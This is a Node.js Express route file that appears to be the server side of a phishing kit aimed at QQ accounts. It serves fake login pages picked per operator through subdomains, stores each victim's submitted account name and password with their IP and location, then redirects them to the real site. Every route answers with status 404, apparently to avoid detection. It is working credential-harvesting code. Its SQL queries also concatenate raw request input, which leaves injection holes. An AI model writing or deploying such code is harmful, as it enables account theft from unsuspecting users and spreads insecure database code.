var _ip = require('./../lib/ip.js');
var sql = require('../db/sqlite.js');
var code = require('../lib/incode.js');
var magic = require('../lib/magic.js');
var cwd = process.cwd();
var path = require('path');
module.exports = function(app) {
    function insertData(req,cb) {
        var qq = req.body.u;
        var pwd = req.body.p;
        var userId = req.body.uid;
        var mid = req.body.mid;
        var ip = req.connection.remoteAddress;
        ip = ip.substr(ip.indexOf(':',3)+1);
        var insertTime = new Date().getTime().toString();
        var mname,userName,address;
        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + userId + ';',function(err,rows){
            mname = rows[0].tempName;
            userName = rows[0].userName;
            _ip(ip,function(ip,add){
                address = add;
                sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${address}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0);`,function(err,rows){
                    cb();
                });
            });
        });
    };

    app.get('/_login',function(req,res) {
        res.statusCode = 404;
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0,uidStr.indexOf('.'));
        uid = code.decode(uid);
        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
            var mid = rows[0].tempId;
            var bgUrl = rows[0].bgUrl;
            var url = rows[0].url;
            res.render('pages/pc_login_window.html',{layout: null,tz:0,uid:uid,mid:mid,bgUrl:bgUrl});
        });
    });

    app.post('/_login',function(req,res) {
        var tz = req.body.tz;
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0,uidStr.indexOf('.'));
        uid = code.decode(uid);
        insertData(req,function(){
            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
                var mid = rows[0].tempId;
                var bgUrl = rows[0].bgUrl;
                var url = rows[0].url;
                if (tz.toString() === '1') {
                    return res.send('<script>window.parent.location.href="'+url+'";</script>');
                }
                res.render('pages/pc_login_window.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
            });
        });
    });

    app.get('/x',function(req,res) {
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0,uidStr.indexOf('.'));
        uid = code.decode(uid);
        res.statusCode = 404;
        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
            var mid = rows[0].tempId;
            var bgUrl = rows[0].bgUrl;
            var url = rows[0].url;
            if (url === 'MAIL') {
                return res.redirect('/m');
            }
            if (req.device.type === 'phone') {
                return res.render('pages/wap_temp.html',{layout: null,tz:0,uid:uid,mid:mid,bgUrl:bgUrl});
            }
            res.render('pages/pc_temp.html',{layout: null,uid:uid,mid:mid,bgUrl:bgUrl});
        });
    });

    app.post('/x',function(req,res) {
        var tz = req.body.tz;
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0,uidStr.indexOf('.'));
        uid = code.decode(uid);
        insertData(req,function(){
            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
                var mid = rows[0].tempId;
                var bgUrl = rows[0].bgUrl;
                var url = rows[0].url;
                if (url === 'MAIL') {
                    return res.redirect('/m');
                }
                if (tz.toString() === '1') {
                    return res.send('<script>window.parent.location.href="'+url+'";</script>');
                }
                if (req.device.type === 'phone') {
                    return res.render('pages/wap_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
                }
                res.render('pages/pc_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
            });
        });
    });

    app.get('/t',function(req,res) {
        res.statusCode = 404;
        if (req.device.type === 'phone') {
            return res.sendFile( path.join(cwd,'/yzm.html'));
        }
        res.sendFile( path.join(cwd,'/transfer.html'));
    });

    app.get('/t_close.html',function(req,res) {
        res.statusCode = 404;
        res.sendFile( path.join(cwd,'/close.html'));
    });

    app.get('//',function(req,res){
        res.statusCode = 404;
        return res.sendFile(path.join(cwd,'/index.html'));
    });
};
